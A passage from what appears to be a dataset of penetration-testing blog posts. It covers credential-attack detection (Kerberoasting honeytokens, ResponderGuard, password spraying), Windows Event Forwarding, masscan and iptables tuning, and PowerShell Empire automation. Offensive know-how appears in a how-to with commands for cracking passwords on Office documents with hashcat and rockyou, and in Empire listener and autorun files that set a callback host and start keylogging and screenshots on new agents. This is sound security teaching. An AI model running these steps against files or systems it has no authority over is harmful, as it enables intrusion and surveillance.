encrypt and sign Kerberos tickets. Essentially, when a domain account is configured to run a service in the environment, such as MS SQL, a Service Principal Name (SPN) is used in the domain to associate the service with a login account. When a user wishes to use the specific resource they receive a Kerberos ticket signed with NTLM hash of the account that is running the service.  This effectively allows any domain user to obtain a crackable hash for a service account on the network - and often times a service account will have at least administrator on the local server where it runs.\n\nThe request for the Kerberos ticket generates Event 4769 on a domain controller in the environment.  With Windows Event Forwarder configured to consolidate event logs, the Kerberos ticket requests are in one place to analyze.\n\nAn approach to detection is to create a HoneyAccount that will have a registered Service Principal Name and will not typically be requested by an end-user. The Set-ADUser commandlet can be used for this, just take care not to duplicate a valid SPN in your environment.\n\nSet-ADUser honeytoken -ServicePrincipalNames @{Add=\"MSSQLSvc/server161:1433\"}\n\nOnce the HoneyAccount has been created, the CredDefenseEventParser PowerShell script can be used to parse the forwarded log to detect Event ID 4769 when the service account matches the HoneyToken value.  This would indicate that it is likely someone is Kerberoasting in the environment.\n\nResponderGuard\n\nOne of the common attacks we as pentesters perform is to attempt NBNS or LLMNR spoofing attacks on a network in hopes of gaining hashed credentials of users. One popular tool for performing this attack is called \u201cResponder\u201d written by Laurent Gaffie. Another great tool for performing this attack is \u201cInveigh\u201d by Kevin Robertson. These tools can do a lot of awesome things but one of the primary functionalities is to function effectively as an NBNS or LLMNR spoofer.\n\nIt is common for us to be successful at obtaining hashed user credentials by using these tools. So how does a defender go about detecting Responder-like activity on a large network? There are a few tools that do detection of Responder on a LAN already out there. But, from what I can tell most are only able to check a single subnet due to how they are broadcasting an NBNS packet used. Another option would be to send honey tokens to every system over SMB on the network but this method would require an attacker to actively crack an NTLMv2 hash and attempt to login prior to receiving an alert that Responder is on the network.\n\nResponderGuard is a PowerShell tool that should allow for the detection of Responder-like activity on a larger scale across networks. It has the ability to locate Responder listeners on foreign subnets by sending targeted NBNS requests to every host in a list of CIDR ranges. With each NBNS request, a random hostname is requested for each IP address. If a host responds that it is the correct host then it is likely that host is an NBNS spoofer.\n\nTo assist with alerting for this activity ResponderGuard writes a Windows event log immediately upon detecting a Responder-like listener on the network. This can be utilized in association with CredDefense or any SIEM of your choice to alert you whenever a Responder-like system is discovered. Just look for event ID 8415.\n\nIn addition to alerting for Responder activity immediately, ResponderGuard also has the ability to serve up honey credentials to the Responder listener. This provides an additional detection mechanism if the attacker attempts to log in to a designated account. In the screenshot below a defender has launched ResponderGuard and it is currently scanning the provided CIDR ranges. It detected an NBNS response from the IP address at 192.168.0.18 for a random hostname. An event was written to the event log and then a set of honey credentials (HoneyDomain\\HoneyUser : Summer2017) were submitted over SMB to the listener.\n\nThe screenshot below shows what the attacker would see in their Responder output. First, Responder reports that a poisoned answer was sent to 192.168.0.12 (Our Windows server running ResponderGuard, which is actually on a completely different subnet being NAT\u2019d). Next, Responder received an SMB authentication request along with NTLMv2 hashed user credentials of our honey user. How you set up these honey tokens could be done in a number of ways. Some options will be discussed later on in this post.\n\nTo run ResponderGuard as a standalone script first download it from here. Then, start a new PowerShell process as an Administrator.\n\nC:> powershell.exe -exec bypass\n\nNext, import the ResponderGuard PowerShell script.\n\nPS C:> Import-Module ResponderGuard.ps1\n\nResponderGuard can be run with or without generating event logs. To write to the Windows Event log each time Responder is detected add the -LoggingEnabled flag to Invoke-ResponderGuard. A list of CIDR ranges can be passed to Invoke-ReponderGuard with the -CidrList option. If you would like to additionally submit a HoneyToken to Responder add the -HoneyTokenSeed option. Make sure you manually change the honey token credentials in the script otherwise HoneyDomain\\HoneyToken will be submitted to Responder.\n\nPS C:> Invoke-ResponderGuard -CidrList C:\\temp\\cidr-list.txt -LoggingEnabled -HoneyTokenSeed\n\nThis tool is very much still in development and more features are being worked on. If you want to help out check out the open issues on the CredDefense repo.\n\nPassword Spraying\n\nPassword spraying is an attack we use on almost every pentest due to how effective it can be in gathering credentials. We\u2019ve written about it a number of times. Password spraying is an attack where basically the attacker generates a large list of usernames and submits one authentication attempt for each of them to avoid account lockout. The password chosen is typically something commonly found to be used by users like \u2018SeasonYear\u2019 (for example: \u2018Fall2017\u2019) or \u2018Companyname123\u2019.\n\nPassword spraying can be performed against pretty much any authentication mechanism but we commonly target Active Directory related services. It can be performed both internally and externally to most networks due to externally exposed web portals tied to Active Directory. Some examples we commonly password spray externally are Outlook Web Access (OWA), ADFS, Exchange Web Services (EWS), Office 365, or even VPN portals.\n\nInternally, a PowerShell tool we at Black Hills InfoSec wrote called DomainPasswordSpray works well for password spraying. It generates a list of user accounts from the domain and attempts to remove anyone close to lockout already. Additionally, it enumerates Fine-Grained Password policies in order to avoid lockouts for accounts under different password policy restrictions.\n\nRegardless of how password spraying is performed, it will generate a large number of failed login events. Many SIEM\u2019s and products alert for brute-forcing of account credentials on a network but most are just looking at a single user account\u2019s failed login attempts and missing password spraying due to the fact that it is one attempt for each account. In order to help alert for password spraying CredDefense parses event logs looking for any individual IP address that generates more than ten failed login attempts in an hour.\n\nThe CredDefenseEventParser.ps1 script included in the repo can be run standalone or from CredDefense. In addition to running in a loop looking at a given Windows Event log fil, it can be directed at a specific event file (evtx) to perform analysis to \u201chunt\u201d for password spraying events. When run in a loop it will continually evaluate a given log file for events. This could be your forwarded events log file where you are collecting the forwarded Windows Event logs from each system in your environment.\n\nConclusion\n\nThe CredDefense Toolkit is meant to be a collection of tools and techniques that can be used to prevent and/or detect many of the common attacks both pentesters and truly malicious individuals have success with. The three of us working on this are red teamers at heart. With CredDefense we are trying to make our lives harder by making it easier for organizations to detect the common attacks we have success with. Oh\u2026 and it is 100% free and open source!\n\nSome things we\u2019ve already included in CredDefense and discussed in this post are the following:\n\nDomain Password Filter (to hopefully prevent users from creating bad passwords in the first place)\n\nPassword doesn\u2019t Expire\n\nKerberoast Detection\n\nEvent Log Consolidation (Using built-in Windows Event tools)\n\nNBNS Spoofing Detection & Honey Token Submission Responder-like systems\n\nPassword Spraying Detection\n\nIf you would like to hear more about CredDefense the video from our talk at DerbyCon 7.0 is available here: https://www.youtube.com/watch?v=4u5gCoCu88Q. We still have a number of other items we want to add in and are hopeful that we can get some community involvement in this project as well. ___   Like what you see? Check back soon for the webcast we'll be posting soon!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"End-Point Log Consolidation with Windows Event Forwarder\"\nTaxonomies: \"Author, Blue Team, Blue Team Tools, Derek Banks, CredDefense, CredDefense Toolkid, End Point Log Consolidation, HoneyToken, kerberoasting, Pentesting, tool, WEF, Windows, Windows Event Forwarder\"\nCreation Date: \"Wed, 27 Sep 2017 15:23:27 +0000\"\nDerek Banks //\n\nI want to expand on our previous blog post on consolidated endpoint event logging and use Windows Event Forwarding and live off the Microsoft land for shipping events to a central location. Why do this?  \n\nI wanted a Windows-based server with all of the event logs from the environment so that I could use PowerShell for analysis purposes. Because then I could potentially just send the forwarded events to an upstream ELK server and visualization and have multiple options to work with the data. This architecture then forms a part of the set-up needed for our CredDefense Toolkit.\n\nAlso, there are some environments where deploying yet another agent to Windows endpoints may not be desirable. WEF has been around for quite some time, but many people do not realize that log consolidation capability is built into Windows and does not use an agent on the endpoint.\n\nThere were a few really good guides that already exist (mentioned in the references links), but they did not get me completely over the hump to getting WEF completely functional. This is probably due to different releases Microsoft Server OSes. Windows Server 2012 was used on the server-side for all of the lab systems and there was a mix of Windows 10 Enterprise and Pro and Windows 7 Pro for workstations.\n\nWindows Event Forwarder Setup\n\nThe first step is to stand up the collector server that will receive the logs from the rest of the windows systems in the environment.  The size of the system will be determined by your environment, but we will not be sending every event, so a modest server can be used and then sized up if requirements change.\n\nFirst, run the following commands on the collector server:\n\nC:>winrm qc\n\nThis starts the WinRM service, and sets the service startup type to auto-start as well as configures a listener for the ports that send and receive WS-Management protocol messages.\n\nNext use wecutil to configure the Windows Event Collector service and that it also starts when the system is rebooted.\n\nC:>wecutil qc\n\nThis will also result in a Service Principal Name being registered for Kerberos authentication.  If you are using an existing server and it has an HTTP SPN already registered WEF will not work unless you remove the existing one.  If you\u2019re using a new system, you probably will not have to worry about it.  If during setup you are having issues and need to check SPN registration, you can do so with:\n\nsetspn -t -q */*\n\nCreate a Test Subscription on Collector server\n\nCreate a domain security group for the endpoints that you wish to monitor and place the target systems in the group. Alternatively, you could just use \u201cDomain Computers\u201d if you are in a testing environment.  Otherwise, using all computers in your environment to initially set up may not be the best idea. Better to start smaller and work outwards than stumble out of the gate.\n\nOnce you work out what the target systems are, on the collector server open Event Viewer and select the Subscriptions. You will likely be prompted to start an auto-configure the Windows Collector service. Select \u201cYes\u201d.\n\nRight-click on Subscriptions and select \u201cCreate Subscription\u201d. For the Subscription Name enter \u201cSecurity Log Cleared\u201d. The Destination log should be \u201cForwarded Events\u201d. Select the radio button for \u201cSource computer initiated\u201d and select \u201cSelect Computer Groups\u2026\u201d. Add the target group that you will initially monitor.\n\nNext, select \u201cSelect Events\u2026\u201d and the Event log drop-down choose the Security log.\n\nFor the purposes of this guide, we will create one GPO that will contain all the settings for forwarding event logs for endpoint security analysis. Additionally, all domain member computers will be forwarding to the same WEF server.  \n\nOpen the Group Policy Management panel and select your domain right-click and select Create a GPO in this domain, and Link it here\u2026 Type in a name, such as Windows Event Forwarding and select OK.\n\nConfigure Event Log Forwarding Entry\n\nUnder Computer>Policies>Admin Templates>Windows Components>Event Forwarding Right click on the Configure target Subscription Manager entry and select Edit.  Select the Enabled radio button and \u201cShow\u201d next to Subscription Managers in the Options pane.\n\nEnter the following line in for the value substituting the Fully Qualified Domain name for the \u201ceventserver.domain.local\u201d portion of the URL below:\n\nServer=http://eventserver.domain.local:5985/wsman/SubscriptionManager/WEC,Refresh=60\n\nNote that this configuration is forwarding over HTTP rather than HTTPS.  The forwarded event traffic can be encrypted and use HTTPS if desired.\n\nTurn on Windows Remote Management (WS-Management) Service via GPO\n\nThe Windows Remote Management (WS-Management) service will need to be started on all the systems that will forward events.  Note that they do not need to be listening on HTTP or HTTPS - the only system that needs that needs to be listening and have firewall rules configured is the WEF server.\n\nTo enable the Windows Remote Management to start on boot, in the Group Policy Management Editor select Computer Configuration>Preferences>Control Panel Settings>Services. Then right-click in the services pane and select New>Service.\n\nIn the startup field, select Automatic (Delayed Start) and select the service name as WinRM - also listed as Windows Remote Management (WS-Management).  Leave the service action to \u201cStart Service\u201d.  Click Apply and OK.\n\nAllow Local Network Service to Access Local Event Logs via GPO\n\nThe local system that will be forwarding the logs to the central WEF server will need to have the Network Service account granted access to read event logs.  There is a built-in Windows group that comes in handy for this called \u201cEvent Log Readers\u201d.\n\nUnder Computer Configuration>Windows Settings>Security Settings>Restricted Groups, right-click and select Add Group\u2026 and type in Event Log Readers and select OK. Right-click on the Event Log Readers group that you just added and select properties and add NETWORK SERVICE.  Click Apply and OK.\n\nSysmon GPO\n\nMicrosoft\u2019s Sysmon is a tool released as part of the Sysinternals Suite. It extends the endpoint\u2019s logging capability beyond the standard event logs. Windows now can natively log the full command line of a process that executes, but Sysmon provides additional data that can be very useful.\n\nHash of executed process\n\nNetwork Connections\n\nFile creation time changes\n\nWMI filters and consumers\n\nOn the local system, it stores these logs in Event Viewer in Application and Services Logs>Microsoft>Windows>Sysmon>Operational. By default, Sysmon logging will create a fair amount of log noise. This is why a configuration file should be used at install time to filter events at the endpoint that are known to be good or alert on specifically known bad. This way, you\u2019ll won\u2019t be shipping more than necessary to the central collector.\n\nWe recommend that you start with the excellent @SwiftOnSecurity configuration file that can be found at their Github page. From there, you can add to the file what you need to further reduce noise in your environment.\n\nOne way to deal with Sysmon deployment is to create a startup script via GPO that runs a batch file to check to see if Sysmon is installed and if not install it with the correct configuration file. If it is installed, make sure the service is started.\n\nA sample install script can be found here. Make sure that the  Sysmon executable, the configuration file, and the batch file are all in a common share. We chose the SYSVOL share - edit the script accordingly to your choice in your environment.\n\nIn the GPO Editor, choose Computer Configuration>Windows Settings>Scripts (Startup/Shutdown) and add in the install script.\n\nPowerShell Script Block and Module Logging\n\nLeveraging PowerShell for attacks has become very popular with both pentesters and actual threat actors.  In the past, PowerShell logging capabilities were lacking, but that changed with PowerShell 5.0. This is the default version of Windows 10, so if you have migrated all Windows Endpoints from Windows 7, you\u2019re good to go.\n\nAt the time of this post, most places have yet to move away completely from Windows 7 though.  If this is true for your environment, you\u2019ll need to install Windows Management Framework 5.0 and turn on logging via GPO. This task is left to the reader to figure out what best fits for their environment for software deployment.\n\nAfter the install, use the GPO editor to turn on Module and Script Block logging. This is in Administrative Templates>Windows Components>Windows PowerShell.\n\nModule logging will record pipeline execution details in Event ID 4103 and has details on scripts and formatted data from the output. Script Block Logging will record code as it is executed by the PowerShell Engine, therefore recording de-obfuscated code, to event ID 4104.\n\nAn additional caveat for Windows 7 systems is to download the Administrative Templates for Windows 10 and copy the PowerShellExecutionPlicy.admx and PowerShellExecutionPolicy.adml to the \\\\sysvol\\Policies\\Policy Definitions directory.\n\nAdditional Subscriptions\n\nAt this point, you should be ready to test out Event Forwarding. Before creating additional subscriptions, clear the event log of one of the subscribed endpoints. You can verify the status of the clients checking in by right-clicking the subscription and choosing Runtime Status. If everything is working appropriately, the cleared log event will soon show up in the Forwarded Events log on the WEF server.\n\nIf all is working correctly, it\u2019s time for creating additional subscriptions that facilitate collecting what matters.  The NSA Spotting the Adversary publication can be used as a guide, below is what we suggest as a minimum.\n\nAccount and Group Activity\n\nThis subscription will collect domain and local group and account activity.  The Security Event Log events to add are: 4624,4625,4648,4728,4732,4634,4735,4740,4756.  These events will be necessary to perform authentication analysis.\n\nKerberos\n\nThis subscription if for event ID 4769 from Domain Controllers.  There will be a large amount of data recorded as ticket requests are frequent, however, paired with a HoneyToken account, it has the potential to detected Kerberoasting attacks.\n\nPowershell Logging\n\nTo collect the module and script block events that were enabled earlier, create a subscription to gather the Microsoft-Windows-PowerShell/Operational log and get Event IDs 4103 and 4104.\n\nSysmon\n\nAll of the Sysmon log will be shipped to the WEF server.  Select the Microsoft-Windows-Sysmon/Operational Event log and leave the targeted computers to \u201cAll Computers\u201d.\n\nShipping Logs to ELK\n\nSimilar to our previous posts on endpoint log consolidation we will use nxlog to ship the logs from the WEF server to an ELK stack.  This architecture allows for usage of PowerShell and C3 tools on the Windows-based log server and EVTX files as well as providing the visualization search capabilities with ELK.\n\nUse the previous blog post to get ELK up and running if you need to.  The configuration file for nxlog will be different.  Install nxlog on the WEF server and modify the configuration file here to point to your ELK stack.\n\nA basic logstash filter for ingesting the forwarded logs can be found here.\n\nConclusion\n\nWindows Event Forwarder provides a native way to consolidate Windows Endpoint logs.  PowerShell and C# tools can be used on the WEF server for analysis of the forwarded events.  Additionally shipping the events to an ELK stack provides visualization and hunting capabilities. The overall design paired with sending specific log files such as authentication, PowerShell module, and script block logging and Sysmon logs creates a DIY SIEM set up that can be used to detect potential attackers in your network.\n\nReferences:\n\nhttps://joshuadlewis.blogspot.com/2014/10/advanced-threat-detection-with-sysmon_74.html\n\nhttps://blogs.technet.microsoft.com/jepayne/2015/11/23/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem/\n\nhttps://github.com/iadgov/Event-Forwarding-Guidance\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Crack Passwords for Password Protected MS Office Documents\"\nTaxonomies: \"How-To, Password Cracking, Red Team, Red Team Tools, Carrie Roberts, Hashcat, John the Ripper, MS Office, password, password protected MS Office document, Red Team, rockyou\"\nCreation Date: \"Mon, 02 Oct 2017 18:46:39 +0000\"\nCarrie Roberts* // (Updated, 2/11/2019)\n\nTrying to figure out the password for a password protected MS Office document? This free solution might do the trick. It attempts to guess the password using a long list of potential passwords that you provide. This works for all MS Office document types (docx, xlsx, pptx, etc). There are three different solutions provided in this blog post so read through the entire thing and choose the one that best fits your needs before you get started.\n\nLet\u2019s say we want to guess the password for a file called crackme.xlsx. Put this file on your desktop along with these two files:\n\nmsoffice-crypt.exe\n\nrockyou.txt\n\nYou can download msoffice-crypt.exe as described here.\n\nThe rockyou file is a well-known list of passwords used for guessing passwords. You can download the rockyou list here. Alternatively, you can make any password list you want, but rockyou is a good start.\n\nSo now you should be set with the three files you need, all in one location: the MS Office file you want to crack the password for (crackme.xlsx), the decryption tool (msoffice-crypte.exe), and a text file full of password guesses (rockyou.txt).\n\nOpen a cmd.exe window and change directories to the location where the three files are located (C:\\Users\\swhite\\Desktop\\Blog in this example) and run the following command:\n\n@FOR /F %p in (rockyou.txt) DO @msoffice-crypt.exe -d -p %p crackme.xlsx 1>NUL && echo [*] score, password is: %p && pause\n\nYou can watch the speed of progress in the cmd window title bar. When the password is found it will be printed on the line that starts with \u201c[*]\u201d and the script will be paused. Just press Ctrl+C to end the script. On my system it would take about 11 days of running this around the clock to guess all 14,344,391 passwords contained in the rockyou list. Maybe you want to start with a smaller list or consider using John the Ripper, or better yet, Hashcat to speed things up.\n\nFor John the Ripper Instructions, check this out:\n\nhttp://breakstuffmajorly.blogspot.com/2015/09/cracking-microsoft-office-file-passwords.html\n\nFor Hashcat Instructions, there is a very nice tutorial here:\n\nhttp://pentestcorner.com/cracking-microsoft-office-97-03-2007-2010-2013-password-hashes-with-hashcat/\n\nFor a quick reference, here are the commands:\n\npython office2john.py crackme.xlsx > hash.txt\n\nYou can find office2john.py here.\n\nhashcat64.exe -a 0 -m 9400 --username hash.txt rockyou.txt\n\nYou determine which flag to use (-m 9400 in the example above) via this chart from pentestcorner.com:\n\n       Office 97-03(MD5+RC4,oldoffice$0,oldoffice$1): flag -m 9700\n\n       Office 97-03(MD5+RC4,collider-mode#1): flag -m 9710\n\n       Office 97-03(MD5+RC4,collider-mode#2): flag -m 9720\n\n       Office 97-03(SHA1+RC4,oldoffice$3,oldoffice$4): flag -m 9800\n\n       Office 97-03(SHA1+RC4,collider-mode#1): flag -m 9810\n\n       Office 97-03(SHA1+RC4,collider-mode#2): flag -m 9820\n\n       Office 2007: flag -m 9400\n\n       Office 2010: flag -m 9500\n\n       Office 2013: flag -m 9600\n\nHashcat brings the time down to 3 hours to guess the entire rockyou list using a standard laptop with a single GPU. Nice!\n\nI hope this comes in handy for you!\n\n*We love when Carrie guest posts for us! Follow her on Twitter @OrOneEqualsOne\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Are You Really Hacking Naked?\"\nTaxonomies: \"Author, How-To, InfoSec 301, Joff Thyer, MASSCAN, Technical\"\nCreation Date: \"Thu, 12 Oct 2017 15:01:21 +0000\"\nJoff Thyer //\n\nI had an interesting experience recently that reminded me to always \u201ctrust but verify.\u201d Let me set the stage for you. As a penetration tester, and IT security consultant, I have a pretty substantial network, and home lab setup. In my case, this includes a fiber optic strand with an associated /28 IPv4 network block. Oh my god, why have we not adopted IPv6!!!! But I digress.\n\nOne of my fine Black Hills colleagues (Sally) asked me to spin up a KALI Linux image for some customer-focused scanning activity using MASSCAN. For your information, the GitHub link for MASSCAN is included here https://github.com/robertdavidgraham/masscan.\n\nThis tool is absolutely awesome. It literally has the ability to scan the entire Internet in under six minutes at a rate of ten million packets per second.\n\nMy Internet Service Provider (in their wisdom) provided me with an Adtran 3140 router as a part of my service installation. The Adtran has an Ethernet handoff to my own router gateway and is connected upstream to a fiber bridge device.\n\nHere\u2019s the challenge\u2026 as soon as MASSCAN kicked off, the Adtran router immediately started dropping packets left and right. Most Information Security consultants would probably say that it was probably a bandwidth problem. Well, it absolutely was NOT since the scan was configured at a mere 400 packets per second or less. I suspected this was actually a connection state tracking issue.\n\nWhy did I think that? Well, let's look at the goal; scan 65535 TCP ports across several hundred IP addresses in a very short amount of time. If the perimeter device was tracking connection state, and let's say we have only 100 IP addresses being scanned in parallel, then we are looking at 655,230 TCP connection states to potentially track in milliseconds.\n\nI called up the ISP and said, \u201cHey folks, can you give me a direct Ethernet handoff to my own router device?\u201d. To my surprise, they said \u201cyes\u201d! I am thinking, \u201cHey cool, now we have the consumer crap out of the way, let\u2019s rock out.\u201d So I call up Sally, and literally say we fixed it and \u201clet it rip at 1000 pps.\u201d\n\nWhat happens next? My Linux router dies an untimely death with system CPU time on router cores maxed out at 100%, and packets start dropping left and right. Let me back up a second here. You might be thinking \u201cHey Joff, your box should have just been bridging the publicly routable box, and how freaking hard is that to do really?\u201d Well yes, this would be the case if the ISP did not require me to route the public IP space being delivered to me, but now that I had that Ethernet handoff, it was my job to be the router, and not just for RFC1918 internal networks.\n\nThe truth? Well, my Linux system was routing the traffic because the ISP actually treated me as the last router hop for my /28. Hey no big deal, I can handle that because I can set some IP forwarding rules up in my iptables configuration and it should be just fine.\n\nHere is a scenario. Imagine your public WAN IP address is 1.2.3.4, and you are lucky enough that your ISP is routing an IP address block of 255.2.2.0/28 to this IP address. What does that mean? Well, any packet directed at 255.2.2.0/28 will arrive at 1.2.3.4.\n\nSo what does your configuration look like? Something like this:\n\nInterfaces:\n\nEth0: 1.2.3.4/24 (or whatever ISP mask they gave you)\nEth1: 255.2.2.1/28\n\nYes, you need to set up IP forwarding in the kernel also so that all packets arriving at 255.1.2.3 will be forwarded right!? Ok this is totally cool but you are a security person, so you set up your firewall gateway to do other cool stuff like perhaps perform network address translation (NAT) for some internal network segments and you have egress filtering to boot!\n\nBeing the total geek that you are, you have a 4 interface system with the ability to not only host the public IP (DMZ) segment on Eth1, you have a couple more networks internally like:\n\nEth2: 192.168.100.1/24\nEth3: 192.168.200.1/24\n\nSo we are now feeling really good about ourselves in that we have constructed a routed network but our firewall rules need to be laid down. In the world of Linux, this will all occur in the \u201cFORWARD\u201d chain of iptables. Let's imagine for a second we want to forward ALL traffic to our DMZ, and only allow selected traffic to flow internally to outside. I am using \u201cselected\u201d pretty liberally here as the below rules allow all TCP/UDP traffic to flow. But the real point is that we would want to track connection state using the \u201cnf_conntrack\u201d module which is a part of the iptables Linux kernel implementation.\n\nA nice appropriate ruleset would be as follows (note that this is in the \u201ciptables-save\u201d format):\n\n# DMZ traffic\n\n-A FORWARD -i eth0 -o eth1 -d 255.2.2.0/28 -j ACCEPT\n\n-A FORWARD -i eth1 -o eth0 -s 255.2.2.0/28 -j ACCEPT\n\n# Internal to Outside Traffic\n\n-A FORWARD -s 192.168.0.0/16 -p tcp -j ACCEPT\n\n-A FORWARD -s 192.168.0.0/16 -p udp -j ACCEPT\n\n-A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT\n\nIntuitively you would think that the above ruleset has you completely covered and everything will be beautiful. Yes, this is absolutely true until you fire up that \u201cMASSCAN\u201d from the DMZ in the 255.2.2.1/28 network segment.\n\nGuess what folks? Since you want to diligently track the state of connections from your internal network segment, your DMZ interfaces are not immune. But wait you say!!? I put rules in that configuration to just let it all pass without hindrance. Not so fast Obi-Wan, the state tracking applies regardless because you told iptables to do that!!\n\nOk so \u201cMASSCAN\u201d fires up and suddenly your connection state table goes from perhaps a few hundred connections (hey, I have kids), to over half a million and your Linux NAT/Firewall box keels over dead.\n\nHow did I verify what was happening? I used the Linux command \u201cconntrack\u201d which shows the state table itself. Basically, if the flow entries figure was very large (in the thousands) then more connection tracking was occurring than I wanted.\n\n# conntrack -L\n\n\u2026 stuff omitted ...\n\nconntrack v1.4.3 (conntrack-tools): 310 flow entries have been shown.\n\nWhat is the solution? There are a couple of thoughts here. One is that we should not track the state of forwarded connections. Having said that, do you REALLY want to just allow ephemeral TCP/UDP ports open in the outside -> inside portion of the configuration? I don\u2019t think so Kemosabe.\n\nThe right answer, in my opinion, is a lovely feature of iptables that allows you to tweak the \u201craw\u201d table such that some connections will never be tracked!\n\nSo perhaps you need to do something like this:\n\n*raw\n-A PREROUTING -i eth1 -s 255.2.2.0/28 ! -d 255.2.2.0/28 -j NOTRACK\n\nIn short, the rule says that if something is entering your home-based Linux router from the DMZ (publicly routable) segment of your network and the packet is destined to the greater Internet, then forget about tracking connection state! In other words, short circuit the remaining logic of iptables and just forward the packet.\n\nAs you might imagine, I researched and implemented something very similar to this in my quest to help Sally and sure enough, it worked like a champ.\n\nSo all in the space of one day, I achieved:\n\nDirect Ethernet handoff from ISP\n\nHappier network performance\n\nHappier kid, and happier Dad\n\nWinning scanner performance!\n\nGo forth and profit, and remember to always \u201cKeep Calm and Hack Naked.\u201d\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Grepping Through PowerView Output\"\nTaxonomies: \"Red Team, Red Team Tools, Grep, PowerShell, PowerView\"\nCreation Date: \"Wed, 18 Oct 2017 15:13:38 +0000\"\nCarrie Roberts//*\nHave you found yourself trying to Grep through PowerView output, or any PowerShell output for that matter, and find that it returns no results for text you know is in the file? PowerShell default output encoding is UTF-16, causing unexpected Grep results.\n\nThe fix is easy, just use the built-in Linux/OS X tool iconv as follows:\n\nMake a mental note and log this away for the next time Grep is making you scratch your head!\n \n*Carrie is one of our favorite BHIS blog post guests!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Empire Resource Files and Auto Runs\"\nTaxonomies: \"Red Team, Red Team Tools, automating commands, Empire, Empire Project, Listeners, PowerShel commands, PowerShell, PowerShell Empire\"\nCreation Date: \"Thu, 26 Oct 2017 14:00:25 +0000\"\nCarrie Roberts* //\n\nI have added resource file and autorun functionality to PowerShell Empire. Empire now has the ability to run multiple commands at once by specifying the commands in a resource file. You can use this feature to automate the startup of your listeners and perform other tasks. In addition, you can specify multiple commands to run automatically on any new agents that connect using the new autorun feature. \n\nConsider the following resource file containing the Empire commands used to startup our go-to listener named http443 on port 443. In this example, the file is called http443.rc and is located in the root directory.\n\nlisteners\n\nuselistener http\n\nset Name http443\n\nset DefaultProfile /admin/login.php,/console/dashboard.asp,/news/today.jsp| Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0);\n\nset Host 192.168.0.124\n\nset Port 443\n\nexecute\n\nTo run all these commands at once within Empire simply use the newly added \u201cresource\u201d command as shown below.\n\nWow, that was easy, one command and everything is started with our custom settings!\n\nHere is another example resource file to generate the OS X and Windows launch commands for our new listener.\n\nlisteners\n\nusestager osx/launcher\n\nset Listener http443\n\nexecute\n\nback\n\nusestager multi/launcher\n\nset Listener http443\n\nexecute\n\nThe image above shows the output from running the launchers.rc resource file. The beginning of the Python launcher is shown at the bottom (echo \u201cimport sys . . .). The Powershell one-liner was also output but not shown in the image for brevity.\n\nNow let\u2019s have a look at the \u201cautorun\u201d command that I added to the agent\u2019s menu. With the autorun command, you can specify a resource file to execute automatically when a new agent connects to your listener. When you set the autorun, you specify which agent language the commands should be run on (e.g. Python or PowerShell). Consider that we have the following in the resource file /root/autorun-py.rc:\n\nusemodule trollsploit/osx/say\n\nset Text Supercalifragilisticexpialidocious\n\nexecute\n\nThis file is intended to execute on a Python agent (OS X) and to speak the text \u201cSupercalifragilisticexpialidocious\u201d using the computer text-to-speech functionality.\n\nNext, we have a resource file specifying three modules to run on any PowerShell agents that connect (/root/autorun-ps.rc):\n\nusemodule collection/keylogger\n\nexecute\n\nback\n\nusemodule collection/screenshot\n\nexecute\n\nback\n\nusemodule trollsploit/voicetroll\n\nset VoiceText Booya\n\nexecute\n\nThe resource file above contains commands to start keylogging, take a screenshot, and say the text \u201cBooya\u201d. The following commands will set the autorun for any Python and PowerShell agents.\n\nTo see what commands have been set for each language, use the \u201cautorun show\u201d command, optionally specifying the language.\n\nOkay, now we have told Empire to execute the autorun-py commands automatically whenever a new Python agent connects and run the autorun-ps commands whenever a new PowerShell agent connects. To clear the autorun setting, use the \u201cautorun clear\u201d command. The first command below clears only the Python autorun commands, while the second command clears autorun commands for all languages.\n\nWe have demonstrated a lot of cool things, but let\u2019s roll all this functionality up into a single resource file that does it all (/root/doitall.rc):\n\n# Start my port 80 http listener\n\nresource /root/http80.rc\n\n# Start my port 443 http listener\n\nresource /root/http443.rc\n\n# set my autorun scripts\n\nresource /root/autoruns.rc\n\n# return to the main menu\n\nmain\n\nThis resource file calls other resource files such as the http443.rc file demonstrated at the beginning of this post. It also starts up a similar listener on port 80 and sets our autoruns using the autoruns.rc file shown below.\n\nagents\n\nautorun /root/autorun-py.rc python\n\nautorun /root/autorun-ps.rc powershell\n\nNote that in the doitall.rc file, descriptive comments are included. Any line that starts with # is considered a comment and ignored by Empire.\n\nWe could run our doitall.rc file from within Empire using the resource command, or we can specify it on the command line when starting Empire with the \u201c--resource\u201d parameter.\n\nAwesome, we started up listeners with custom settings and set our autoruns all with a single command! Very nice! Here is a video walkthrough of everything discussed in this post.\n\nhttps://youtu.be/5WmssrVMmEI\n\nTo use this new feature, grab the Empire code from https://github.com/EmpireProject/Empire. Until these features are merged into a release or the Master branch you\u2019ll have to check out the dev branch to use these features. I hope you enjoy this new functionality as much as I do, it definitely removes a large pain point when using Empire and makes way for a high degree of automation.\n\n________\n \n*Though Carrie no longer works for BHIS, she remains our good friend and loyal guest post contributor! You can follow her on Twitter.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Google Calendar Event Injection with MailSniper\"\nTaxonomies: \"Author, Beau Bullock, Mike Felch, Red Team, Red Team Tools, Event Injection, G Suite, Google, Google Calendar\"\nCreation Date: \"Wed, 01 Nov 2017 20:00:29 +0000\"\nBeau Bullock & Michael Felch //\n\nSource: https://chrome.google.com/webstore/detail/google-calendar-by-google/gmbgaklkmjakoegficnlkhebmhkjfich\n\nOverview\n\nGoogle Calendar is one of the many features provided to those who sign up for a Google account along with other popular services such as Gmail and Google Drive. Following email, the calendar is probably the second most used piece of productivity software in an enterprise. It allows employees to schedule out the workweek so that things can actually get accomplished. Google has an interesting feature that automatically adds various events to your calendar. If your Google account receives an email stating you have booked flights, reservations for a dinner, or even movie tickets, Google will automatically add these events to your calendar.\n\nBlack Hills Information Security took a deeper look at how these events were being generated. BHIS discovered that it was not required to send an email to a target to create an event on their calendar. Additionally, there are security controls that can be enabled on a Google account that attempt to prevent this from happening, but BHIS discovered bypasses to these controls. In this post, BHIS will discuss this \u201cEvent 